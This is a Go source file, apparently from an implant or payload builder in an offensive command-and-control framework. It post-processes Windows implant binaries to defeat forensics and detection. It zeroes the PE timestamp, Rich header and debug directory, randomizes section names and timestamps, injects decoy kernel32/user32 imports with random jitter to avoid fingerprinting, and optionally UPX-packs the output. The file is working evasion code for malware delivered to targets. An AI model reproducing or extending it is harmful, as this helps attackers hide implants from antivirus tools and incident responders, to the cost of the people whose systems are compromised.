package payload

import (
	"bytes"
	"context"
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// finalizePE applies the full per-build PE forensic randomization pipeline:
// artifact stripping, timestamp handling, section-name randomization and
// benign-import mimicry. Every step uses fresh crypto/rand material so two
// binaries built from the same config never share PE headers. Callers must
// run patchSelfCheckHash AFTER this so the integrity hash covers final bytes.
func finalizePE(outPath string, cfg ImplantConfig, goarch string) {
	switch cfg.PETimestampMode {
	case "keep":
		// keep original Go timestamp
	default:
		if err := stripPEArtifacts(outPath); err != nil {
			fmt.Fprintf(os.Stderr, "warning: strip PE artifacts: %v\n", err)
		}
		if cfg.PETimestampMode == "random" {
			if ts, err := GenerateTimestamp(TSRandom, ""); err == nil {
				if data, err := os.ReadFile(outPath); err == nil {
					ApplyTimestamp(data, ts)
					_ = os.WriteFile(outPath, data, 0644)
				}
			}
		}
	}
	// Optional PE section name randomization
	if cfg.PESectionMode == "random" {
		if data, err := os.ReadFile(outPath); err == nil {
			cfgSec := PESectionConfig{
				Text:  "." + randomHex(3),
				Data:  "." + randomHex(3),
				Rdata: "." + randomHex(3),
				Reloc: "." + randomHex(3),
			}
			ApplyPESectionNames(data, cfgSec)
			_ = os.WriteFile(outPath, data, 0644)
		}
	}
	// Optional benign import mimic with per-build subset jitter: even in
	// kernel32+user32 mode we randomly drop to kernel32-only for some builds
	// so the import table is not a stable fingerprint.
	if cfg.PEImportMode != "" && cfg.PEImportMode != "none" {
		if data, err := os.ReadFile(outPath); err == nil {
			var dlls []string
			if cfg.PEImportMode == "kernel32" {
				dlls = []string{"kernel32.dll"}
			} else {
				dlls = []string{"kernel32.dll", "user32.dll"}
				if b := make([]byte, 1); func() bool { _, err := rand.Read(b); return err == nil }() {
					if b[0]%2 == 0 {
						dlls = []string{"kernel32.dll"}
					}
				}
			}
			if out, err := AddBenignImports(data, dlls); err == nil {
				_ = os.WriteFile(outPath, out, 0644)
			}
		}
	}
}

// stripPEArtifacts removes forensic PE artifacts: timestamp, Rich Header, Debug Directory.
// It returns the underlying write error so a failed in-place rewrite is not
// mistaken for a stripped artifact.
func stripPEArtifacts(path string) error {
	data, err := os.ReadFile(path)
	if err != nil || len(data) < 0x100 {
		return err
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return nil // not a PE file
	}
	// eLfanew is a 32-bit little-endian offset to the PE signature. Reading
	// only 2 bytes (as before) is wrong and, for any exe whose eLfanew does
	// not fit in 16 bits, would compute a garbage offset and corrupt the file.
	if 0x40 > len(data) {
		return nil
	}
	eLfanew := int(data[0x3C]) | int(data[0x3D])<<8 | int(data[0x3E])<<16 | int(data[0x3F])<<24
	if eLfanew < 0 || eLfanew+4 >= len(data) {
		return nil
	}
	if string(data[eLfanew:eLfanew+4]) != "PE\x00\x00" {
		return nil // malformed PE
	}

	// Optional header magic selects PE32 (0x10b) vs PE32+ (0x20b); the data
	// directory array lives at a different offset in each, so zeroing the
	// debug directory at a hardcoded PE64 offset on a PE32 binary corrupts it.
	if eLfanew+0x18+2 > len(data) {
		return nil
	}
	magic := int(data[eLfanew+0x18]) | int(data[eLfanew+0x19])<<8
	dataDirBase := eLfanew + 0x70 // PE32+ (amd64/arm64)
	if magic == 0x10b {
		dataDirBase = eLfanew + 0x60 // PE32 (386)
	}

	// 1. Zero timestamp at PE+8
	tsOffset := eLfanew + 8
	if tsOffset+4 <= len(data) {
		for i := range 4 {
			data[tsOffset+i] = 0
		}
	}

	// 2. Zero Rich Header (between DOS stub and PE signature). Search backwards
	// from the PE signature for the "Rich" magic.
	richStart := 0
	for i := eLfanew - 4; i >= 0x80; i-- {
		if data[i] == 'R' && data[i+1] == 'i' && data[i+2] == 'c' && data[i+3] == 'h' {
			richStart = i
			break
		}
	}
	if richStart > 0 {
		// Zero from Rich marker to PE signature
		for i := richStart; i < eLfanew; i++ {
			data[i] = 0
		}
	}

	// 3. Clear Debug Directory entry in data directory
	// Data directory index 6 = IMAGE_DIRECTORY_ENTRY_DEBUG
	debugDirOffset := dataDirBase + 6*8
	if debugDirOffset+8 <= len(data) {
		for i := range 8 {
			data[debugDirOffset+i] = 0
		}
	}

	return os.WriteFile(path, data, 0600)
}

// windowsMachine maps the requested architecture to the PE Machine field so we
// can assert the produced binary is the architecture the operator asked for.
func windowsMachine(arch string) uint16 {
	switch arch {
	case "arm64":
		return 0xAA64
	case "386":
		return 0x014c
	default:
		return 0x8664 // amd64
	}
}

// normalizeArch canonicalizes common architecture aliases to Go's GOARCH value.
func normalizeArch(arch string) string {
	arch = strings.ToLower(strings.TrimSpace(arch))
	switch arch {
	case "x86_64":
		return "amd64"
	case "aarch64":
		return "arm64"
	case "i386", "x86", "386":
		return "386"
	case "arm":
		return "arm"
	}
	return arch
}

// resolveBuildArch returns the GOARCH to build for the given OS/arch, or an
// error if that combination is unsupported. This makes architecture selection
// honest: an unsupported request fails the build loudly instead of silently
// producing a different (wrong) architecture.
func resolveBuildArch(goos, arch string) (string, error) {
	a := normalizeArch(arch)
	for _, s := range supportedArchByOS[goos] {
		if s == a {
			return a, nil
		}
	}
	return "", fmt.Errorf("architecture %q is not supported for %s implants; supported: %s",
		arch, goos, strings.Join(supportedArchByOS[goos], ", "))
}

// validatePE confirms path is a well-formed PE for the expected machine type
// (0x8664 amd64, 0x014c 386, 0xAA64 arm64). A malformed or wrong-architecture
// binary must never be delivered to an operator — doing so produces a file
// Windows rejects with "This app can't run on your PC". Validating here turns
// any such regression (bad strip, broken ldflags, wrong GOARCH) into a clear
// build failure instead of a silently corrupted download.
func validatePE(path string, machine uint16) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	if len(data) < 0x40 || data[0] != 'M' || data[1] != 'Z' {
		return fmt.Errorf("not a PE (missing MZ header)")
	}
	if 0x40 > len(data) {
		return fmt.Errorf("truncated PE")
	}
	eLfanew := int(data[0x3C]) | int(data[0x3D])<<8 | int(data[0x3E])<<16 | int(data[0x3F])<<24
	if eLfanew < 0 || eLfanew+4 >= len(data) || string(data[eLfanew:eLfanew+4]) != "PE\x00\x00" {
		return fmt.Errorf("missing PE signature")
	}
	if eLfanew+4+2 > len(data) {
		return fmt.Errorf("truncated COFF header")
	}
	got := uint16(data[eLfanew+4]) | uint16(data[eLfanew+5])<<8
	if got != machine {
		return fmt.Errorf("unexpected PE machine 0x%04x, wanted 0x%04x", got, machine)
	}
	return nil
}

// maybeCompressUPX runs an optional UPX pass over a freshly built implant.
// It only acts when cfg.UPX is set and format is exe or elf (UPX Mach-O and
// c-shared DLL support is unreliable, so those are skipped silently).
// A missing upx binary is a skip, not an error — unlike garble, UPX is pure
// size optimization with no security promise attached. A failed UPX run
// restores the pre-compression bytes and fails loudly rather than shipping
// a possibly corrupt binary. Must run BEFORE patchSelfCheckHash so the
// integrity hash covers the final bytes.
func maybeCompressUPX(outPath string, cfg ImplantConfig, format string) error {
	if !cfg.UPX {
		return nil
	}
	if format != "exe" && format != "elf" {
		fmt.Printf("upx: skipping unsupported format %q (exe/elf only)\n", format)
		return nil
	}
	upxPath, err := exec.LookPath("upx")
	if err != nil {
		fmt.Printf("upx: binary not found in PATH, skipping compression (install UPX to enable)\n")
		return nil
	}
	orig, err := os.ReadFile(outPath)
	if err != nil {
		return fmt.Errorf("upx: read for backup: %w", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	cmd := exec.CommandContext(ctx, upxPath, "--lzma", "-q", outPath)
	cmd.Env = goModuleEnv()
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		_ = os.WriteFile(outPath, orig, 0644)
		return fmt.Errorf("upx compression failed (original restored): %w\n%s", err, stderr.String())
	}
	compressed, err := os.ReadFile(outPath)
	if err != nil || len(compressed) == 0 || len(compressed) >= len(orig) {
		_ = os.WriteFile(outPath, orig, 0644)
		if err == nil && len(compressed) >= len(orig) {
			fmt.Printf("upx: no size gain (%d -> %d bytes), keeping original\n", len(orig), len(compressed))
			return nil
		}
		return fmt.Errorf("upx: compressed output invalid, original restored")
	}
	fmt.Printf("upx: compressed %d -> %d bytes\n", len(orig), len(compressed))
	return nil
}
